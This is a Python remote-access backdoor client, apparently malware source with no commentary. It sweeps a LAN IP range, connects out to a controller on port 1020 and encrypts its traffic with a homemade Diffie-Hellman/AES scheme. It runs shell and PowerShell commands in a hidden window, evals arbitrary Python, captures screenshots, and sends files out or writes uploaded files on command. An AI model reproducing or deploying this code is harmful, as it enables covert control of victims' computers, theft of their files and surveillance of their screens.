import socket, os, base64, subprocess, threading, time, random
from Crypto.Cipher import AES
from Crypto import Random

###Setup Encriptor
primeN = 3534635645620271361541209209607897224734887106182307093292005188843884213420695035531516325888970426873310130582000012467805106432116010499008974138677724241907444538851271730464985654882214412422106879451855659755824580313513382070785777831859308900851761495284515874808406228585310317964648830289141496328996622685469256041007506727884038380871660866837794704723632316890465023570092246473915442026549955865931709542468648109541
privateBB = random.randint(0, primeN)
publicBB = pow(2, privateBB, primeN)



def encriptionKey(x):
    privateB = privateBB
    publicB = publicBB
    sock.sendall(str(publicB))
    publicA = sock.recv(1024)
    encriptionkey = str(pow(int(publicA),privateB , primeN))
    enckey = str(encriptionkey)[4:36]
    return enckey

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def encriptString(x):
    message = pad(x)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(encriptKey, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def decriptString(x):
    iv = x[:AES.block_size]
    cipher = AES.new(encriptKey, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(x[AES.block_size:])
    return plaintext.rstrip(b"\0")


ippre = '192.168.1.'
ipset = 60
ip = ippre + str(ipset)
out = ''
fin = 0


def docommand():
    global fin
    CREATE_NO_WINDOW = 0x08000000
    output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              creationflags=CREATE_NO_WINDOW)
    out = output.communicate()[0]
    sock.sendall(encriptString(out))
    if out > 0:
        fin = 1


while True:

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.settimeout(0.2)
        sock.connect((ip, 1020))
        sock.settimeout(None)
        encriptKey = ""
        encriptKey = encriptionKey(encriptKey)

    except:
        print ("No connection on " + ip)
        ipset += 1
        if ipset == 81:
            ipset = 60
        ip = ippre + str(ipset)
        pass

    while True:

        sendback = True

        try:
            data = decriptString(sock.recv(65536))
            if ("cd " in data and sendback == True):
                try:
                    sendback = False
                    os.chdir(data[3:])
                    sock.sendall(encriptString(os.popen("dir").read()))
                except:
                    sock.sendall(encriptString("No Such Directory"))
            elif "python " in data and sendback == True:
                sendback = False
                try:
                    output = eval(data[7:])
                    sock.sendall(encriptString(output))
                except:
                    sock.sendall(encriptString("Python Command Failed or No Output"))

            elif "powershell " in data and sendback == True:
                sendback = False
                fin = 0
                Thread = threading.Timer(fin, docommand)
                Thread.daemon = True
                Thread.start()
                time.sleep(10)
                if fin == 0:
                    Thread.cancel()
                    sock.sendall(encriptString("Powershell Command Failed"))

            elif "_screenshot_" in data and sendback == True:
                try:
                    sendback = False
                    randomnum = random.randrange(1, 3057098743573230598)
                    TEMP = str(os.environ['TEMP'])
                    name = TEMP + '\+~JF' + str(randomnum) + '.bmp'
                    from PIL import ImageGrab

                    im = ImageGrab.grab()
                    im.save(name)
                    time.sleep(0.3)
                    with open(name, "rb") as image_file:
                        encoded_string = base64.b64encode(image_file.read())

                    sock.sendall(encriptString(encoded_string))
                    im.close()
                    os.remove(name)
                except:
                    sock.sendall(encriptString("Screenshot Failed"))

            elif "_donwload_" in data and sendback == True:
                sendback = False
                location = data[11:]
                with open(location, "rb") as image_file:
                    encoded_string = base64.b64encode(image_file.read())
                sock.sendall(encriptString(str(len(encoded_string))))
                time.sleep(2)
                sock.sendall(encriptString(encoded_string))


            elif "_upload_" in data and sendback == True:
                sendback = False
                name = data[9:]
                num = decriptString(sock.recv(10000))
                filecon = decriptString(sock.recv(int(num)))
                fh = open(name, "wb")

                fh.write(filecon.decode('base64'))
                fh.close()

            else:
                fin = 0
                Thread = threading.Timer(fin, docommand)
                Thread.daemon = True
                Thread.start()
                time.sleep(1.5)
                if fin == 0:
                    sock.sendall(encriptString("Command Failed"))
                    Thread.cancel()
        except:
            break
